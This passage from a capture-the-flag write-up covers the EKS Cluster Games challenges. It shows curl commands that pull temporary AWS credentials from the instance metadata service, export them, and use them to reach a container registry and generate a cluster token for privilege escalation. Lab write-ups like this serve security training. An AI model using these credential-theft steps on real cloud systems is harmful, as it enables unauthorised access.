<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">crane</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">config</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">688655246681</span><span style="color: #96D0FF">.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01</span></span>
<span data-line=""><span style="color: #F69D50">Error:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">fetching</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">config:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">reading</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">image</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01":</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">GET</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">https://688655246681.dkr.ecr.us-west-1.amazonaws.com/v2/central_repo-aaf4a7c/manifests/sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">unexpected</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">status</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">code</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">401</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Unauthorized:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Not</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Authorized</span></span></code></pre></div>
<p>Since I expect the pod already has AWS access, lets check if the AWS CLI works:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">aws</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sts</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">get-caller-identity</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">Unable</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">to</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">locate</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">credentials.</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">You</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">can</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">configure</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">credentials</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">by</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">running</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"aws configure".</span></span></code></pre></div>
<p>Credentials are not configured right now, so we need to discover them.  Lets
check if we have metadata server access:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">curl</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">http://169.254.169.254/latest/meta-data/iam</span></span>
<span data-line=""><span style="color: #F69D50">info</span></span>
<span data-line=""><span style="color: #F69D50">security-credentials/</span></span></code></pre></div>
<p>We do!  So we should be able to pull the credentials out of there to get access
to AWS:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">curl</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-sS</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole</span><span style="color: #F47067">|</span><span style="color: #F69D50">jq</span></span>
<span data-line=""><span style="color: #ADBAC7">{</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #F69D50">"AccessKeyId"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"ASIA2AVYNE&#x3C;*REDACTED*>",</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #F69D50">"Expiration"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"2023-11-03 03:50:19+00:00",</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #F69D50">"SecretAccessKey"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"e4TuLKKPBAVvyPkhKiJG0jO0&#x3C;*REDACTED*",</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #F69D50">"SessionToken"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"FwoGZXIvYXdzEBQaDAM9SyNaDBowmWoT1SK3AbqDZUQpyn&#x3C;*REDACTED*>"</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span></code></pre></div>
<p>Lets set those as environment variables to activate our AWS access:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F47067">export</span><span style="color: #ADBAC7"> AWS_ACCESS_KEY_ID</span><span style="color: #F47067">=</span><span style="color: #96D0FF">"ASIA2AVYNE&#x3C;*REDACTED*"</span></span>
<span data-line=""><span style="color: #F47067">export</span><span style="color: #ADBAC7"> AWS_SECRET_ACCESS_KEY</span><span style="color: #F47067">=</span><span style="color: #96D0FF">"e4TuLKKPBAVvyPkhKiJG0jO0&#x3C;*REDACTED*"</span></span>
<span data-line=""><span style="color: #F47067">export</span><span style="color: #ADBAC7"> AWS_SESSION_TOKEN</span><span style="color: #F47067">=</span><span style="color: #96D0FF">"FwoGZXIvYXdzEBQaDAM9SyNaDBowmWoT1SK3AbqDZUQpyn&#x3C;*REDACTED*>"</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">aws</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sts</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">get-caller-identity</span></span>
<span data-line=""><span style="color: #ADBAC7">{</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"UserId"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"ASIA2AVYNE&#x3C;*REDACTED*>:i-0cb922c6673973282",</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"Account"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"688655246681",</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"Arn"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282"</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span></code></pre></div>
<p>Now we should be able to authenticate crane and inspect the image from ECR:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">export</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">PASSWORD=$(</span><span style="color: #F69D50">aws</span><span style="color: #96D0FF"> ecr get-login-password)</span></span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">crane</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">auth</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">login</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-u</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">AWS</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-p</span><span style="color: #ADBAC7"> $PASSWORD </span><span style="color: #6CB6FF">688655246681</span><span style="color: #96D0FF">.dkr.ecr.us-west-1.amazonaws.com</span><span style="color: #ADBAC7">  </span></span>
<span data-line=""><span style="color: #F69D50">2023/11/03</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">02</span><span style="color: #96D0FF">:56:41</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">logged</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">in</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">via</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">/home/user/.docker/config.json</span></span></code></pre></div>
<p>Lets get those layers!</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">crane</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">config</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">688655246681</span><span style="color: #96D0FF">.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01</span><span style="color: #F47067">|</span><span style="color: #F69D50">jq</span></span>
<span data-line=""><span style="color: #ADBAC7">{</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #F69D50">"architecture"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"amd64",</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #F69D50">"config"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">{</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"Env"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> [</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span></span>
<span data-line=""><span style="color: #ADBAC7">    ],</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"Cmd"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> [</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"/bin/sleep"</span><span style="color: #F69D50">,</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"3133337"</span></span>
<span data-line=""><span style="color: #ADBAC7">    ],</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"ArgsEscaped"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">true</span><span style="color: #96D0FF">,</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"OnBuild"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">null</span></span>
<span data-line=""><span style="color: #ADBAC7">  },</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #F69D50">"created"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"2023-11-01T13:32:07.782534085Z",</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #F69D50">"history"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> [</span></span>
<span data-line=""><span style="color: #ADBAC7">    {</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"created"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"2023-07-18T23:19:33.538571854Z",</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"created_by"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"/bin/sh -c #(nop) ADD file:7e9002edaafd4e4579b65c8f0aaabde1aeb7fd3f8d95579f7fd3443cef785fd1 in / "</span></span>
<span data-line=""><span style="color: #ADBAC7">    },</span></span>
<span data-line=""><span style="color: #ADBAC7">    {</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"created"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"2023-07-18T23:19:33.655005962Z",</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"created_by"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"/bin/sh -c #(nop)  CMD [</span><span style="color: #F47067">\"</span><span style="color: #96D0FF">sh</span><span style="color: #F47067">\"</span><span style="color: #96D0FF">]",</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"empty_layer"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">true</span></span>
<span data-line=""><span style="color: #ADBAC7">    },</span></span>
<span data-line=""><span style="color: #ADBAC7">    {</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"created"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"2023-11-01T13:32:07.782534085Z",</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"created_by"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"RUN sh -c #ARTIFACTORY_USERNAME=challenge@eksclustergames.com ARTIFACTORY_TOKEN=wiz_eks_challenge{the_history_of_container_images_could_reveal&#x3C;*REDACTED*>} ARTIFACTORY_REPO=base_repo /bin/sh -c pip install setuptools --index-url intrepo.eksclustergames.com # buildkit # buildkit",</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"comment"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"buildkit.dockerfile.v0"</span></span>
<span data-line=""><span style="color: #ADBAC7">    },</span></span>
<span data-line=""><span style="color: #ADBAC7">    {</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"created"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"2023-11-01T13:32:07.782534085Z",</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"created_by"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"CMD [</span><span style="color: #F47067">\"</span><span style="color: #96D0FF">/bin/sleep</span><span style="color: #F47067">\"</span><span style="color: #96D0FF"> </span><span style="color: #F47067">\"</span><span style="color: #96D0FF">3133337</span><span style="color: #F47067">\"</span><span style="color: #96D0FF">]",</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"comment"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"buildkit.dockerfile.v0",</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"empty_layer"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">true</span></span>
<span data-line=""><span style="color: #ADBAC7">    }</span></span>
<span data-line=""><span style="color: #ADBAC7">  ],</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #F69D50">"os"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"linux",</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #F69D50">"rootfs"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">{</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"type"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"layers",</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"diff_ids"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> [</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"sha256:3d24ee258efc3bfe4066a1a9fb83febf6dc0b1548dfe896161533668281c9f4f"</span><span style="color: #F69D50">,</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"sha256:9057b2e37673dc3d5c78e0c3c5c39d5d0a4cf5b47663a4f50f5c6d56d8fd6ad5"</span></span>
<span data-line=""><span style="color: #ADBAC7">    ]</span></span>
<span data-line=""><span style="color: #ADBAC7">  }</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span></code></pre></div>
<p>Looks like they made the same mistake again and leaked the secret in the image
layers!</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="" data-theme="default"><code data-language="" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #adbac7">wiz_eks_challenge{the_history_of_container_images_could_reveal&#x3C;*REDACTED*>} </span></span></code></pre></div>
<p>Time for challenge 4!</p>
<h1>Challenge 4</h1>
<p>The hint:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="" data-theme="default"><code data-language="" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #adbac7">You're inside a vulnerable pod on an EKS cluster. Your pod's service-account has</span></span>
<span data-line=""><span style="color: #adbac7">no permissions. Can you navigate your way to access the EKS Node's privileged</span></span>
<span data-line=""><span style="color: #adbac7">service-account?</span></span></code></pre></div>
<p>This sounds like we're going to need to escalate our privileges through the AWS
access we acquired in the last challenge. Lets start with inspecting the
environment again:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubectl</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">get</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">pod</span></span>
<span data-line=""><span style="color: #F69D50">Error</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">from</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">server</span><span style="color: #ADBAC7"> (Forbidden): pods is forbidden: User </span><span style="color: #96D0FF">"system:serviceaccount:challenge4:service-account-challenge4"</span><span style="color: #ADBAC7"> cannot list resource </span><span style="color: #96D0FF">"pods"</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">in</span><span style="color: #ADBAC7"> API group </span><span style="color: #96D0FF">""</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">in</span><span style="color: #ADBAC7"> the namespace </span><span style="color: #96D0FF">"challenge4"</span></span></code></pre></div>
<p>So we don't even have access to list pods!   Do we have any access?</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubectl</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">auth</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">can-i</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--list</span></span>
<span data-line=""><span style="color: #F69D50">warning:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">the</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">list</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">may</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">be</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">incomplete:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">webhook</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">authorizer</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">does</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">not</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">support</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">user</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">rule</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">resolution</span></span>
<span data-line=""><span style="color: #F69D50">Resources</span><span style="color: #ADBAC7">                                       </span><span style="color: #96D0FF">Non-Resource</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">URLs</span><span style="color: #ADBAC7">                     </span><span style="color: #96D0FF">Resource</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Names</span><span style="color: #ADBAC7">     </span><span style="color: #96D0FF">Verbs</span></span>
<span data-line=""><span style="color: #F69D50">selfsubjectaccessreviews.authorization.k8s.io</span><span style="color: #ADBAC7">   []                                    []                 [create]</span></span>
<span data-line=""><span style="color: #F69D50">selfsubjectrulesreviews.authorization.k8s.io</span><span style="color: #ADBAC7">    []                                    []                 [create]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/.well-known/openid-configuration]   []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/api/</span><span style="color: #F47067">*</span><span style="color: #ADBAC7">]                              []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/api]                                []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/apis/</span><span style="color: #F47067">*</span><span style="color: #ADBAC7">]                             []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/apis]                               []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/healthz]                            []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/healthz]                            []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/livez]                              []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/livez]                              []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/openapi/</span><span style="color: #F47067">*</span><span style="color: #ADBAC7">]                          []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/openapi]                            []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/openid/v1/jwks]                     []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/readyz]                             []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/readyz]                             []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/version/]                           []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/version/]                           []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/version]                            []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/version]                            []                 [get]</span></span>
<span data-line=""><span style="color: #F69D50">podsecuritypolicies.policy</span><span style="color: #ADBAC7">                      []                                    [eks.privileged]   [use]</span></span></code></pre></div>
<p>That is <em>very</em> minimal access. So we are going to have to try get a token using
the escalated privileges.  Usually we could use <code>aws eks get-token</code> but that
requires knowing the cluster name and I don't know that.   Lets try to list the
clusters:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">aws</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">eks</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">list-clusters</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">An</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">error</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">occurred</span><span style="color: #ADBAC7"> (AccessDeniedException) when calling the ListClusters operation: User: arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282 is not authorized to perform: eks:ListClusters on resource: arn:aws:eks:us-west-1:688655246681:cluster/</span><span style="color: #F47067">*</span></span></code></pre></div>
<p>So they haven't given us much to go on at all here.  The role itself <em>might</em> be
a clue but that is relying on them being consistent with their naming:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="" data-theme="default"><code data-language="" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #adbac7">arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/</span></span></code></pre></div>
<p>The cluster name <em>might</em> be <code>eks-challenge-cluster</code> based on that but I can't
guarantee that. Lets check its security groups:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">curl</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-sS</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">http://169.254.169.254/latest/meta-data/security-groups</span><span style="color: #ADBAC7">;</span><span style="color: #6CB6FF">echo</span></span>
<span data-line=""><span style="color: #F69D50">eks-cluster-sg-eks-challenge-cluster-963543728</span></span></code></pre></div>
<p>The name is there again.  I don't feel good about not having more details but it
is at least worth trying it:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">aws</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">eks</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">get-token</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--cluster-name</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">eks-challenge-cluster</span></span>
<span data-line=""><span style="color: #ADBAC7">{</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"kind"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"ExecCredential",</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"apiVersion"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"client.authentication.k8s.io/v1beta1",</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"spec"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">{},</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"status"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">{</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #F69D50">"expirationTimestamp"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"2023-11-03T03:38:10Z",</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #F69D50">"token"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"k8s-aws-v1.aHR0cHM6Ly9zdHMudXMtd2VzdC0xLmFtYX&#x3C;*REDACTED*"</span></span>
<span data-line=""><span style="color: #ADBAC7">    }</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span></code></pre></div>
<p>This gets us a token, so lets try to use it:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">export</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">TOKEN=$(</span><span style="color: #F69D50">aws</span><span style="color: #96D0FF"> eks get-token </span><span style="color: #6CB6FF">--cluster-name</span><span style="color: #96D0FF"> eks-challenge-cluster</span><span style="color: #F47067">|</span><span style="color: #F69D50">jq</span><span style="color: #96D0FF"> '.status.token' </span><span style="color: #6CB6FF">-r</span><span style="color: #96D0FF">)</span></span>
